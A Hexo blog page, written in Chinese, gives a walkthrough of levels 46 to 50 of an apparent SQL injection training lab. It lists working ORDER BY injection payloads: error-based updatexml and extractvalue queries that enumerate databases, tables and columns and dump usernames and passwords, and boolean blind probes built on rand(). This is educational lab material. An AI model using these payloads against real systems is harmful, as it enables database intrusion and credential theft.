@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sql 46-50关 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sql第四十六关 1.这关开始的页面就告诉我们以sort为参数，输入了个?sort&#x3D;1，发现直接把用户以及密码都给我们了，也暂时不用管，照常注入即可，上网参考一下 2.展示一下源代码，$id&#x3D;$_GET[‘sort‘]，$sql &#x3D; “SELECT * FROM users ORDER BY $id”;从上述的 sql 语句中我们可以看出，我们的注入点在 order">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql 46-50关">
+<meta property="og:url" content="http://example.com/2022/12/26/sql-46-50%E5%85%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql第四十六关 1.这关开始的页面就告诉我们以sort为参数，输入了个?sort&#x3D;1，发现直接把用户以及密码都给我们了，也暂时不用管，照常注入即可，上网参考一下 2.展示一下源代码，$id&#x3D;$_GET[‘sort‘]，$sql &#x3D; “SELECT * FROM users ORDER BY $id”;从上述的 sql 语句中我们可以看出，我们的注入点在 order">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-12-26T06:00:12.000Z">
+<meta property="article:modified_time" content="2023-04-13T06:25:05.447Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sql-46-50关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/26/sql-46-50%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-12-26T06:00:12.000Z" itemprop="datePublished">2022-12-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sql 46-50关
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql第四十六关</p>
+<p>1.这关开始的页面就告诉我们以sort为参数，输入了个?sort&#x3D;1，发现直接把用户以及密码都给我们了，也暂时不用管，照常注入即可，上网参考一下</p>
+<p>2.展示一下源代码，$id&#x3D;$_GET[‘sort‘]，$sql &#x3D; “SELECT * FROM users ORDER BY $id”;从上述的 sql 语句中我们可以看出，我们的注入点在 order by 后面的参数中，而 order by不同于的我们在 where 后的注入点，不能使用 union 等进行注入。order by后面可以使用limit，into outfile等语句，还可以跟数字等。发现是数字型注入</p>
+<p>3.?sort&#x3D;1 and updatexml(1,concat(‘~’,(select group_concat(schema_name)from information_schema.schemata)),0)报错注入</p>
+<p>4.?sort&#x3D;1 and updatexml(1,concat(‘~’,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;’security’)),0)爆表</p>
+<p>5..爆users表的表列?sort&#x3D;1 and updatexml(1,concat(‘~’,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’)),0)</p>
+<p>6.爆users表的所有字段?sort&#x3D;1 and updatexml(1,concat(‘<del>‘,(select concat_ws(‘</del>‘,id,username,password)from security.users limit 0,1)),0)</p>
+<p>sql第四十七关</p>
+<p>1.单引号闭合，其它一样</p>
+<p>sql第四十八关</p>
+<p>1.数字型注入，输入?sort&#x3D;extractvalue(1,concat(0x7e,database(),0x7e))–+没成功报错回显，看起来要用布尔型</p>
+<p>2.?sort&#x3D;rand(length(database())&gt;5)–+猜长度</p>
+<p>3.输入?sort&#x3D;rand(mid(database(),1,1)&gt;’m’)–+判断数据库第一个字母范围</p>
+<p>4.?sort&#x3D;rand((select count(table_name)from information_schema.tables where table_schema&#x3D;database())&gt;5)–+判断数据表张数，从结果来看，数据表张数&lt;&#x3D;5</p>
+<p>5.输入?sort&#x3D;rand(length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;5)–+判断第一张数据表长度，从结果来看，第一张数据表长度&gt;5</p>
+<p>6.输入?sort&#x3D;rand(mid((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)&gt;’m’)–+判断第一张数据表的第一个字母范围，从结果看，在[a,m]间</p>
+<p>7.输入?sort&#x3D;rand((select count(column_name)from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’)&gt;5)–+判断符合条件的字段数，从结果来看，字段数&lt;&#x3D;5</p>
+<p>8.输入?sort&#x3D;rand(length((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1))&gt;5)–+判断第一个字段长度</p>
+<p>9.输入?sort&#x3D;rand(mid((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),1,1)&gt;’m’)–+判断第一个字段的第一个字母是否&gt;m</p>
+<p>10.输入?sort&#x3D;rand((select count(username) from users)&gt;5)–+判断username记录数是否&gt;5</p>
+<p>11.输入?sort&#x3D;rand(mid((select username from users limit 0,1),1,1)&gt;’m’)–+判断第一条记录的第一个字母范围</p>
+<p>sql第四十九关</p>
+<p>1.也是盲注，闭合方式为’，其它同上</p>
+<p>sql第五十关</p>
+<p>1.报错堆叠注入等方式均有效，不再赘述</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/26/sql-46-50%E5%85%B3/" data-id="clgeqkfhl0000gcxx1sr3ad1v" data-title="sql 46-50关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/04/11/sql-26-30%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql 26-30关
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/12/23/test/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">test</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/12/22/sql-36-40%E5%85%B3/">sql 36-40关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/15/sql-11-15%E5%85%B3/">sql 11-15关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/12/sql-41-45%E5%85%B3/">sql 41-45关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/11/sql-26-30%E5%85%B3/">sql 26-30关</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/26/sql-46-50%E5%85%B3/">sql 46-50关</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
